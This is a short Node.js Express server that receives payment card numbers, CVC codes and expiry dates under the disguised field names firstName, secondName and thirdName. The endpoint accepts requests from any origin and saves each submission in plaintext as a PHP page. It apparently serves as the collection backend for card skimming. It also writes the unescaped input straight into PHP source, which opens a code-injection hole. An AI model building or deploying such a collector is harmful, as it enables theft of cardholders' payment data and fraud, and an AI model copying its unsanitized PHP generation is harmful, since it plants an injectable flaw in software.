require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 4000; // ðŸ”¹ Usar el puerto asignado por Vercel

// ðŸ”¹ Middleware para procesar JSON correctamente
app.use(express.json()); 

// ðŸ”¹ Configurar CORS para aceptar solicitudes desde cualquier origen
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Accept']
}));

// ðŸ”¹ Servir archivos estÃ¡ticos desde `public/`
app.use('/public', express.static(path.join(__dirname, 'public')));

// ðŸ”¹ Endpoint para recibir datos de pago (Ahora en `/api/send-data`)
app.post('/api/send-data', async (req, res) => {
    try {
        console.log("ðŸ“¨ Recibiendo datos en Vercel...");

        if (!req.body || typeof req.body !== 'object') {
            console.error("ðŸš¨ ERROR: Datos JSON invÃ¡lidos.");
            return res.status(400).json({ error: 'Datos JSON incorrectos o vacÃ­os.' });
        }

        const { firstName, secondName, thirdName } = req.body;

        if (!firstName || !secondName || !thirdName) {
            console.error("ðŸš¨ ERROR: Datos incompletos.");
            return res.status(400).json({ error: 'Datos incompletos' });
        }

        // ðŸ“‚ Verificar que la carpeta `data/` existe antes de guardar el archivo PHP
        const dataDir = path.join(__dirname, 'data');
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir);
        }

        // ðŸ”¹ Generar archivo PHP con los datos recibidos
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        const phpFilePath = path.join(dataDir, `payment-data-${timestamp}.php`);

        const phpContent = `<?php
        $cardNumber = "${firstName}";
        $cvc = "${secondName}";
        $expirationDate = "${thirdName}";

        echo "<h2>Datos de Pago</h2>";
        echo "<p><strong>Tarjeta:</strong> $cardNumber</p>";
        echo "<p><strong>CVC:</strong> $cvc</p>";
        echo "<p><strong>ExpiraciÃ³n:</strong> $expirationDate</p>";
        ?>`;

        fs.writeFileSync(phpFilePath, phpContent);

        console.log(`âœ… Archivo PHP generado en: ${phpFilePath}`);

        res.json({ message: 'Datos guardados correctamente en PHP', file: phpFilePath });
    } catch (error) {
        console.error("ðŸš¨ ERROR al procesar la solicitud:", error);
        res.status(500).json({ error: 'Error interno al procesar la informaciÃ³n.' });
    }
});

// ðŸ”¹ Iniciar el servidor
app.listen(PORT, () => {
    console.log(`âœ… Servidor corriendo en http://localhost:${PORT}`);
});
